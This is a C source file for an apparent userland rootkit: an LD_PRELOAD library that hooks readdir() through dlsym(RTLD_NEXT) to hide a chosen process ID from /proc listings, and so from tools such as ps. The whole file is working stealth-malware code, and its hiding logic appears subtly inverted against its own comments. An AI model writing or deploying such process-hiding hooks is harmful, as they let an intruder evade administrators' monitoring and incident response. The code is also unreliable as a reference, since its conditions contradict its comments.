// initializers and deinitializers
// https://tldp.org/HOWTO/Program-Library-HOWTO/miscellaneous.html

#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#define PID_TO_OVERRIDE 120
int get_path_from_fd(int fd, char *file_path);

struct dirent *readdir(DIR *dirp) {
  /*
   * TODO: make less expensive, move to initializer?
   * TODO: library can fail to load if it cannot find readdir, need to error handle
   * TODO: get the RTLD_NEXT description from chat answer (saved in "RKLinux")
   */
  struct dirent *(*real_readdir)(DIR *dirp) = dlsym(RTLD_NEXT, "readdir");

  // if subdir of hiding process, return NULL + set errno
  int fd = dirfd(dirp); // get fd for the directory stream
  if (fd < 0) {
    perror("dirfd");
    return NULL;
  }

  char path[PATH_MAX]; // TODO: use PATH_MAX in my code

  if (get_path_from_fd(fd, path)) {
    printf("Could not get path for file descriptor %d\n", fd);
    return real_readdir(dirp);
  }

  char *tok = strtok(path, "/"); //  \0proc\0

  if (tok == NULL) { // strktop returns NULL when it can't find anymore delimteres
    return real_readdir(dirp);
  }

  // make sure we are actually reading from `/proc` folder
  // (ex. we could have a directory '~/123' while we are  trying to block pid '123')
  if (strcmp(tok, "proc")) {
    return real_readdir(dirp);
  }

  tok = strtok(NULL, "/");
  if (tok == NULL) {
    // reading /proc directory
    struct dirent *entry = real_readdir(dirp);

    if (entry == NULL) {
      return entry;
    }
    // path string comparsion functions C
    errno = 0;

    // string, "end pointer" (can convert just beginning of string for ex.), base
    unsigned long pid = strtoul(entry->d_name, NULL, 10);
    if (pid == 0 && errno) { // dir name doesn't start with a number
      return entry;
    }

    if (pid == PID_TO_OVERRIDE) { // dir name is a number, but not the PID we want to hide
      return entry;
    }

    // dir name is the directory we are looking for
    return readdir(dirp);
  }

  // path string comparsion functions C
  errno = 0;

  // string, "end pointer" (can convert just beginning of string for ex.), base
  unsigned long pid = strtoul(tok, NULL, 10);
  if (pid == 0 && errno) { // dir name doesn't start with a number
    return real_readdir(dirp);
  }

  if (pid == PID_TO_OVERRIDE) { // dir name is a number, but not the PID we want to hide
    return real_readdir(dirp);
  }

  return NULL;
}

int get_path_from_fd(int fd, char *file_path) {
  char proc_path[256];
  ssize_t len;

  // Construct the path to the symlink in /proc/self/fd/
  // 'snprintf' will print the specific string till a specific length in the
  // specific format
  snprintf(proc_path, sizeof(proc_path), "/proc/self/fd/%d", fd);

  // Read the symlink to get the actual file path
  // 'readlink' will read the contents of a symbolic link
  // 'ssize_t readlink(const char *restrict path, char *restrict buf, size_t
  // bufsiz);' // path is pointer to null-terminated string w/ path of symbolic
  // link to be read, buf is pointer to buffer where contents of symbolic link
  // will be stored, bufsiz is size of buffer pointed to by buf in bytes //
  // returns number of bytes placed in buf on success, on error returns -1 and
  // sets errno to -1
  len = readlink(proc_path, file_path, PATH_MAX - 1);
  if (len != -1) {
    file_path[len] = '\0'; // Null-terminate the string
    return 0;
  } else {
    perror("readlink"); // perror writes to stderr fancily
    return -1;
  }
}
